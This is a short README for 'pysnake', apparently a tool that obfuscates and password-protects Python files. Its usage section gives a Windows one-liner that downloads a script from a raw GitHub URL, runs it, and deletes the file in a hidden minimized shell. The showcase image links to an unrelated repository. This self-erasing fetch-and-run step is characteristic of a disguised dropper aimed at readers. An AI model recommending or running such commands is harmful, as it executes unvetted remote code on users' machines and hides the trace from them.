# pysnake
A multi-stage python program locker which uses dynamic runtime reconstruction, which lets you obfuscate and password protect files with ease.

# how to use
This is a simple way to run pysnake from command prompt, alternatively, you can run the main.js file for standalone use when python isn't installed on the current machine, or the main.py file itself.

```batch
curl -sS -o pys.py "https://raw.githubusercontent.com/psy-chedelic/pysnake/refs/heads/main/main.py" && start /min cmd.exe /c "timeout /t 1 >nul 2>&1 && del pys.py && exit" && python pys.py
```

# showcase
![explorer](https://github.com/repossess/pybear/blob/main/images/explorer.png?raw=true)
